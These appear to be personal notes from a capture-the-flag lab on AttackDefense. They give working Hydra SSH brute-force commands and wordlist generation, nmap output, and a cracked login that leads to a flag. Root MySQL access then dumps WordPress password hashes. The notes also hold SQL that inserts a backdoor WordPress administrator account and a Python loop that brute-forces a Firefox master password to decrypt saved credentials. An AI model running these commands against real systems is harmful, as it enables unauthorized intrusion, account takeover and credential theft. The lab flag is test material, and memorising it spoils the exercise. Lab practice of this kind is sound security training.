[SHELL]

- ip addr
- dig +short myip.opendns.com @resolver1.opendns.com   :: To know the public ip.
- ssh webadmin@192.95.174.3

>> Attacker 192.95.174.2/24 
>> Victim 192.95.174.3

[FLAGS]

- FLAG1: eeb5b85022a819c4178a04d11bc24aab

[WEBSERVER]

>> Create a python http server in kali machine

      - python -m SimpleHTTPServer

[NMAP]

- nmap -sC -T4 -A 192.95.174.3


[HYDRA]

- hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.95.174.3 -t 4 ssh

- hydra -l root -P /usr/share/wordlists/rockyou.txt 192.95.174.3 -t 4 ssh

- crunch 4 4 012345abcdef -o Documents/pass.txt

- hydra -l root -P Documents/pass.txt 192.168.1.105 -t 4 ssh

- hydra -L /usr/share/wordlists.rockyou.txt -P /usr/share/wordlists/rockyou.txt -M Documents/ip.txt -t 4 ssh

[MYSQL]

>> Create a wordpress user and make the user as admin.

- INSERT INTO `wp_users` (`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_status`) VALUES (‘devptest’, MD5(‘pentester’), ‘devptest’, 'dev@ptest.com', '0');

- INSERT INTO `wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, (Select max(id) FROM wp_users), 'wp_capabilities', 'a:1:{s:13:"administrator";s:1:"1";}');

- INSERT INTO `wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, (Select max(id) FROM wp_users), 'wp_user_level', '10');


[HYDRA RESULT]

>> root@attackdefense:~# hydra -L tools/users.txt -P /usr/share/wordlists/rockyou.txt 192.95.174.3 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-10-11 22:40:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100410793 login tries (l:7/p:14344399), ~6275675 tries per task
[DATA] attacking ssh://192.95.174.3:22/
[STATUS] 258.00 tries/min, 258 tries in 00:01h, 100410537 to do in 6486:29h, 16 active
[22][ssh] host: 192.95.174.3   login: webadmin   password: denise

=====================

root@attackdefense:~# ssh webadmin@192.95.174.3
webadmin@192.95.174.3's password:
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
webadmin@victim:~$ ls -alj
ls: invalid option -- 'j'
Try 'ls --help' for more information.
webadmin@victim:~$ ls -alh
total 24K
drwxrwx--- 1 webadmin webadmin 4.0K Oct 11 22:41 .
drwxr-xr-x 1 root     root     4.0K Oct  4 14:30 ..
drwx------ 2 webadmin webadmin 4.0K Oct 11 22:41 .cache
drwxr-xr-x 1 webadmin webadmin 4.0K Oct  4 14:30 .mozilla
-rw-r--r-- 1 root     root       33 Oct  4 14:30 FLAG1
webadmin@victim:~$ cat FLAG1
eeb5b85022a819c4178a04d11bc24aab
webadmin@victim:~$


>> ~/.mozilla/firefox/l3a35nq4.default



[LAB]

>> nmap -sC -T4 -A 192.95.174.3

Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-11 21:56 UTC
Nmap scan report for z411m2voxeixr7d8tqo5espz6.temporary-95-174 (192.95.174.3)
Host is up (0.000073s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3f:36:f4:b1:44:05:29:73:69:34:a8:05:4b:1b:8e:d4 (RSA)
|   256 b0:99:b9:70:5a:bf:99:25:20:fc:96:64:f8:35:b3:39 (ECDSA)
|_  256 5d:a8:77:41:7b:87:e5:e6:5d:c6:eb:dd:fa:18:d8:b6 (ED25519)
23/tcp open  telnet  Linux telnetd
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Target WordPress &#8211; Just another WordPress site
MAC Address: 02:42:C0:5F:AE:03 (Unknown)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.07 ms z411m2voxeixr7d8tqo5espz6.temporary-95-174 (192.95.174.3)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.93 seconds

=================================
webadmin@victim:~$ ls
FLAG1
webadmin@victim:~$ mysql -uroot
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1
Server version: 5.6.35-1+deb.sury.org~xenial+0.1 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show database;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'database' at line 1
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| app                |
| mysql              |
| performance_schema |
| test               |
+--------------------+
5 rows in set (0.00 sec)

mysql> use app
Database changed
mysql> show tables;
+--------------------------------+
| Tables_in_app                  |
+--------------------------------+
| wp_commentmeta                 |
| wp_comments                    |
| wp_links                       |
| wp_options                     |
| wp_postmeta                    |
| wp_posts                       |
| wp_responsive_thumbnail_slider |
| wp_term_relationships          |
| wp_term_taxonomy               |
| wp_termmeta                    |
| wp_terms                       |
| wp_usermeta                    |
| wp_users                       |
+--------------------------------+
13 rows in set (0.00 sec)

mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BJ9gTPIylmHQFSvu1UqhBQUkALCOVp/ | admin         | admin@localhost.xyz |          | 2018-07-09 08:56:13 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.01 sec)

mysql>
=================================


[SCRIPT]

#!/usr/bin/python

import sys
from subprocess import Popen, PIPE

f = open(sys.argv[1], 'r')
for line in f:
    password = line.strip()
    p = Popen(['./firepwd.py','-p',password,'-d','./'], stdout=PIPE)
    output = p.stdout.read()
    if output.find('decrypting') != -1 :
        print "[+] master Password: " + password
        sys.exit(0)
    print "[-] Failed with Master password: " + password


[LINKS]

- https://www.linkedin.com/pulse/ctf-1-ctf-server-1-writeup-attackdefensecom-krishna-kumaran-gk-/
- https://linuxconfig.org/ssh-password-testing-with-hydra-on-kali-linux
- https://pastebin.com/raw/dLLg7S1S
- https://www.pentesteracademy.com/video?id=396
- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
